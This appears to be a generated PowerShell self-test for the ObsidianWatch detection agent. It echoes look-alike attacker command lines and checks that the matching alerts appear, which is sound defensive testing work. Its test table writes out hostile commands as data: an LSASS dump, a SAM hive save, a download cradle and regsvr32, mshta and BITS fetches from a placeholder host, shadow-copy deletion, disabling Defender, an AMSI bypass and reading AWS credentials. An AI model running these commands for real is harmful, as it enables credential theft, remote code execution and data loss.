#requires -Version 5.1
<#
.SYNOPSIS
  ObsidianWatch Windows alert self-test. GENERATED FILE - do not edit by hand.
  Regenerate: OW_UPDATE_SIM=1 go test ./internal/api -run TestSimScriptsUpToDate

.DESCRIPTION
  Runs harmless look-alikes of attacker behaviour on THIS machine (it only
  echoes command text, or sets and removes a temporary HKCU Run value that
  points at nothing), then asks your management server whether each expected
  alert appeared. Nothing is exploited, downloaded or executed.

  Use a test machine: it deliberately creates real alerts (and may email or
  webhook them). Every test command line carries the marker OWSIM-<nonce> so
  the alerts are easy to find and close afterwards.

  The machine needs the ObsidianWatch agent running (Sysmon recommended, so
  command lines are captured).

.EXAMPLE
  .\ow-simulate-windows.ps1 -ApiUrl https://obsidianwatch.example.com -Username admin -SkipCertCheck

.EXAMPLE
  .\ow-simulate-windows.ps1 -List
#>
[CmdletBinding()]
param(
  [string]$ApiUrl,                       # e.g. https://obsidianwatch.example.com
  [string]$Username = 'admin',
  [string]$Token = $env:OW_TOKEN,        # or set OW_TOKEN to skip the login prompt
  [string]$HostName = $env:COMPUTERNAME, # the host name as the agent reports it
  [int]$WaitSeconds = 180,               # how long to wait for alerts
  [string]$Only = '',                    # comma-separated rule IDs to run
  [switch]$SkipCertCheck,                # accept a self-signed server certificate
  [switch]$NoVerify,                     # run the actions but do not query the server
  [switch]$List,                         # print the tests and exit
  [switch]$Force                         # skip the confirmation prompt
)
$ErrorActionPreference = 'Stop'

$Cases = @(
  @{ Id='W-T1003.001'; Title='[T1003.001] LSASS Memory Dump'; Kind='proc'; Text='procdump -ma lsass.exe out.dmp' }
  @{ Id='W-T1003.002'; Title='[T1003.002] SAM Database Access'; Kind='proc'; Text='reg save hklm\sam sam.hiv' }
  @{ Id='W-T1016'; Title='[T1016] Network Configuration Discovery'; Kind='proc'; Text='ipconfig /all' }
  @{ Id='W-T1021.001'; Title='[T1021.001] RDP Lateral Movement'; Kind='proc'; Text='mstsc /v:10.0.0.5' }
  @{ Id='W-T1027'; Title='[T1027] Obfuscated Command'; Kind='proc'; Text='powershell [convert]::FromBase64String(''aGk='')' }
  @{ Id='W-T1047'; Title='[T1047] WMI Remote Execution'; Kind='proc'; Text='wmic /node:srv01 process call create calc.exe' }
  @{ Id='W-T1053.005'; Title='[T1053.005] Scheduled Task Created'; Kind='proc'; Text='schtasks /create /tn x /tr calc.exe' }
  @{ Id='W-T1055'; Title='[T1055] Process Injection'; Kind='proc'; Text='procdump -ma 624 out.dmp' }
  @{ Id='W-T1057'; Title='[T1057] Process Discovery'; Kind='proc'; Text='tasklist /v' }
  @{ Id='W-T1059.001a'; Title='[T1059.001] PowerShell Encoded Command'; Kind='proc'; Text='powershell -enc SQBFAFgAIAA=' }
  @{ Id='W-T1059.001b'; Title='[T1059.001] PowerShell Download Cradle'; Kind='proc'; Text='powershell iex(new-object net.webclient).downloadstring(''http://x/a'')' }
  @{ Id='W-T1059.003'; Title='[T1059.003] Suspicious CMD Execution'; Kind='proc'; Text='cmd.exe /c whoami' }
  @{ Id='W-T1059.005'; Title='[T1059.005] WScript/CScript Execution'; Kind='named'; Name='wscript.exe'; Text='job.vbs' }
  @{ Id='W-T1087'; Title='[T1087] Account Enumeration'; Kind='proc'; Text='net user admin' }
  @{ Id='W-T1134'; Title='[T1134] Token Impersonation'; Kind='proc'; Text='x.exe getsystem' }
  @{ Id='W-T1197'; Title='[T1197] BITS Job Abuse'; Kind='proc'; Text='bitsadmin /transfer j http://x/a.exe c:\a.exe' }
  @{ Id='W-T1218.005'; Title='[T1218.005] MSHTA Execution'; Kind='named'; Name='mshta.exe'; Text='http://x/a.hta' }
  @{ Id='W-T1218.007'; Title='[T1218.007] Msiexec Remote Install'; Kind='named'; Name='msiexec.exe'; Text='/i http://x/a.msi /q' }
  @{ Id='W-T1218.010'; Title='[T1218.010] Regsvr32 Squiblydoo Bypass'; Kind='named'; Name='regsvr32.exe'; Text='/s /u /i:http://x/a.sct scrobj.dll' }
  @{ Id='W-T1490'; Title='[T1490] Shadow Copy Deletion'; Kind='proc'; Text='vssadmin delete shadows /all /quiet' }
  @{ Id='W-T1543.003'; Title='[T1543.003] New Service Created'; Kind='proc'; Text='sc create evil binpath= c:\x.exe' }
  @{ Id='W-T1546.003'; Title='[T1546.003] WMI Event Subscription'; Kind='proc'; Text='powershell Set-WmiInstance -Class __EventFilter' }
  @{ Id='W-T1547.001'; Title='[T1547.001] Run Key Persistence'; Kind='reg'; Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; Data='C:\Users\a\AppData\Local\Temp\x.exe' }
  @{ Id='W-T1548.002'; Title='[T1548.002] UAC Bypass Technique'; Kind='proc'; Text='fodhelper.exe' }
  @{ Id='W-T1552.001'; Title='[T1552.001] Credential Search in Files'; Kind='proc'; Text='findstr /si password *.txt' }
  @{ Id='W-T1552.005'; Title='[T1552.005] Cloud Credential File Access'; Kind='proc'; Text='type c:\users\a\.aws\credentials' }
  @{ Id='W-T1562.001a'; Title='[T1562.001] Security Tool Disabled'; Kind='proc'; Text='powershell Set-MpPreference -DisableRealtimeMonitoring $true' }
  @{ Id='W-T1562.001b'; Title='[T1562.001] AMSI Bypass Attempt'; Kind='proc'; Text='powershell [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')' }
  @{ Id='W-T1566.001'; Title='[T1566.001] Shell Spawned with Office-Related Arguments'; Kind='proc'; Text='cmd.exe /c copy c:\users\a\desktop\x.docm' }
  @{ Id='W-T1570'; Title='[T1570] PsExec / Remote Execution Tool'; Kind='proc'; Text='psexec \\srv cmd' }
  @{ Id='W-T1595'; Title='[T1595.001] Port Scanning Tool'; Kind='proc'; Text='nmap -sS 10.0.0.0/24' }
)
$Skipped = @(
  @{ Id='W-ACCT-001'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-ACCT-002'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-ACCT-003'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-ACCT-004'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-RDP-001'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1036'; Reason='needs the real process or event; a harmless stand-in does not trigger it' }
  @{ Id='W-T1070.001'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1110'; Reason='needs a real logon event (log, file or system change)' }
  @{ Id='W-T1218.011'; Reason='needs the real process or event; a harmless stand-in does not trigger it' }
  @{ Id='W-T1486'; Reason='needs a real file event (log, file or system change)' }
  @{ Id='W-T1543.003b'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1546.003b'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1546.012'; Reason='needs a real registry event (log, file or system change)' }
  @{ Id='W-T1547.001b'; Reason='needs a real registry event (log, file or system change)' }
  @{ Id='W-T1562.001c'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1562.001d'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1562.002'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1562.006'; Reason='needs a real eventlog event (log, file or system change)' }
  @{ Id='W-T1574.002'; Reason='needs a real file event (log, file or system change)' }
  @{ Id='W-USB-001'; Reason='needs a real eventlog event (log, file or system change)' }
)

if ($Only) { $ids = $Only.Split(',') | ForEach-Object { $_.Trim() }; $Cases = @($Cases | Where-Object { $ids -contains $_.Id }) }

if ($List) {
  Write-Host ("{0} runnable tests:" -f $Cases.Count)
  $Cases | ForEach-Object { Write-Host ("  {0,-14} {1}" -f $_.Id, $_.Title) }
  Write-Host ""
  Write-Host ("{0} rules cannot be simulated safely from a script:" -f $Skipped.Count)
  $Skipped | ForEach-Object { Write-Host ("  {0,-14} {1}" -f $_.Id, $_.Reason) }
  return
}

if (-not $NoVerify -and -not $ApiUrl) { throw 'Pass -ApiUrl (or use -NoVerify to only run the actions).' }
if (-not $Force) {
  Write-Host ("This will create about {0} test alerts for host '{1}'." -f $Cases.Count, $HostName) -ForegroundColor Yellow
  if ((Read-Host 'Type YES to continue') -ne 'YES') { return }
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
if ($SkipCertCheck -and $PSVersionTable.PSVersion.Major -lt 7) {
  Add-Type @"
using System.Net; using System.Security.Cryptography.X509Certificates;
public class OwTrustAll : ICertificatePolicy { public bool CheckValidationResult(ServicePoint s, X509Certificate c, WebRequest r, int p) { return true; } }
"@
  [System.Net.ServicePointManager]::CertificatePolicy = New-Object OwTrustAll
}
function Invoke-Api([string]$Method, [string]$Path, $Body) {
  $p = @{ Method = $Method; Uri = ($ApiUrl.TrimEnd('/') + $Path); ContentType = 'application/json'; UseBasicParsing = $true }
  if ($script:Token) { $p.Headers = @{ Authorization = "Bearer $script:Token" } }
  if ($Body) { $p.Body = ($Body | ConvertTo-Json -Compress) }
  if ($SkipCertCheck -and $PSVersionTable.PSVersion.Major -ge 7) { $p.SkipCertificateCheck = $true }
  Invoke-RestMethod @p
}
function Get-HostAlerts {
  $all = @()
  foreach ($h in @($HostName, $HostName.ToUpper(), $HostName.ToLower()) | Select-Object -Unique) {
    $r = Invoke-Api GET ('/api/v1/alerts?host=' + [uri]::EscapeDataString($h)) $null
    if ($r.alerts) { $all += $r.alerts }
  }
  $all
}

$baseline = 0
if (-not $NoVerify) {
  if (-not $Token) {
    $sec = Read-Host ("Password for '{0}'" -f $Username) -AsSecureString
    $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($sec))
    $Token = (Invoke-Api POST '/auth/login' @{ username = $Username; password = $plain }).token
  }
  $existing = Get-HostAlerts
  if ($existing) { $baseline = ($existing | Measure-Object -Property id -Maximum).Maximum }
}

$nonce = -join ((48..57) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
$cmd = Join-Path $env:SystemRoot 'System32\cmd.exe'
$simDir = Join-Path $env:TEMP ('owsim-' + $nonce)
New-Item -ItemType Directory -Path $simDir -Force | Out-Null
Write-Host ("Running {0} tests (marker OWSIM-{1})..." -f $Cases.Count, $nonce)
foreach ($c in $Cases) {
  try {
    if ($c.Kind -eq 'proc') {
      Start-Process -FilePath $cmd -ArgumentList ('/c echo OWSIM-' + $nonce + ' ' + $c.Text) -WindowStyle Hidden -Wait
    } elseif ($c.Kind -eq 'named') {
      # a harmless stand-in: a copy of whoami.exe renamed like the tool, run with its arguments
      $stand = Join-Path $simDir $c.Name
      Copy-Item (Join-Path $env:SystemRoot 'System32\whoami.exe') $stand -Force
      Start-Process -FilePath $stand -ArgumentList ($c.Text + ' OWSIM-' + $nonce) -WindowStyle Hidden -Wait
    } else {
      $name = 'OWSIM-' + $nonce
      New-ItemProperty -Path $c.Path -Name $name -Value $c.Data -PropertyType String -Force | Out-Null
      Start-Sleep -Seconds 2
      Remove-ItemProperty -Path $c.Path -Name $name -ErrorAction SilentlyContinue
    }
    $c.Ran = $true
  } catch { $c.Ran = $false; $c.Error = $_.Exception.Message }
  Start-Sleep -Milliseconds 300
}

if ($NoVerify) { Remove-Item $simDir -Recurse -Force -ErrorAction SilentlyContinue; Write-Host 'Actions done; verification skipped.'; return }

Write-Host ("Waiting up to {0}s for alerts (agent flush + detection cycle)..." -f $WaitSeconds)
$deadline = (Get-Date).AddSeconds($WaitSeconds)
$found = @{}
do {
  Start-Sleep -Seconds 10
  $new = Get-HostAlerts | Where-Object { $_.id -gt $baseline }
  foreach ($c in $Cases) { if ($c.Ran -and -not $found[$c.Id] -and ($new | Where-Object { $_.title -eq $c.Title })) { $found[$c.Id] = $true } }
  $pending = @($Cases | Where-Object { $_.Ran -and -not $found[$_.Id] }).Count
} while ($pending -gt 0 -and (Get-Date) -lt $deadline)

$pass = 0; $fail = 0
Write-Host ''
foreach ($c in $Cases) {
  if (-not $c.Ran)        { Write-Host ("ERROR {0,-14} {1}  ({2})" -f $c.Id, $c.Title, $c.Error) -ForegroundColor Red; $fail++ }
  elseif ($found[$c.Id])  { Write-Host ("PASS  {0,-14} {1}" -f $c.Id, $c.Title) -ForegroundColor Green; $pass++ }
  else                    { Write-Host ("FAIL  {0,-14} {1}" -f $c.Id, $c.Title) -ForegroundColor Red; $fail++ }
}
Write-Host ''
Write-Host ("{0} passed, {1} failed, {2} rules not simulable (run with -List)." -f $pass, $fail, $Skipped.Count)
if ($fail -gt 0) {
  Write-Host 'A FAIL means the event never produced that alert. Check, in order: agent running and connected; Sysmon running (command lines);' -ForegroundColor Yellow
  Write-Host 'the rule is enabled and not in observe/allowlist mode; the host name matches -HostName; the alert was not suppressed.' -ForegroundColor Yellow
}
Remove-Item $simDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Host ("Close the test alerts afterwards: search alerts for the marker OWSIM-{0}." -f $nonce)
exit ([int]($fail -gt 0))
